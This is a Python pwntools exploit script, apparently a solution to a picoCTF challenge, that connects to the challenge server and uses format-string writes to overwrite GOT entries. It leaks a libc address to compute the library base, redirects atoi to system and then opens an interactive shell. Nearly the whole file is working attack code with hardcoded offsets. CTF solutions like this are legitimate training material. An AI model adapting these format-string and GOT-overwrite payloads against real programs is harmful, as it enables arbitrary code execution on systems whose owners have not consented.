from pwn import *
from LibcSearcher import *

context.log_level = "debug"

# r = process("./chall")
r = remote("mars.picoctf.net", 31929)
exe = ELF("./chall")

r.recvuntil(b"A: ")
r.sendline(b"1111%2080c%12$hn" + p64(exe.got.pow))
r.recvuntil(b"B: ")
r.sendline(b"2 %109$p")
r.recvuntil(b"2 ")
libc_start_call_main_ret = int(r.recvline().decode().strip(), 16)
debug("_libc_start_call_main_ret: " + hex(libc_start_call_main_ret))
libc_base = libc_start_call_main_ret - 0x0270B3
libc_system = libc_base + 0x55410
libc_atoi = libc_base + 0x47730
# atoi and system address in libc have only 3 bytes difference
# so we only need to write 3 bytes on atoi's address in GOT table

high_one_byte = (libc_system >> 16) & 0xFF
low_two_bytes = libc_system & 0xFFFF
first = high_one_byte - 20
second = low_two_bytes - high_one_byte


r.recvuntil(b"A: ")
r.sendline(
    "1%{first}c%16$hhn%{second}c%17$hn".format(first=first, second=second)
    .ljust(48, "1")
    .encode("utf-8")
    + p64(exe.got.atoi + 2)
    + p64(exe.got.atoi)
)
r.recvuntil(b"B: ")
r.sendline(b"1")

r.recvuntil(b"A: ")

r.interactive()
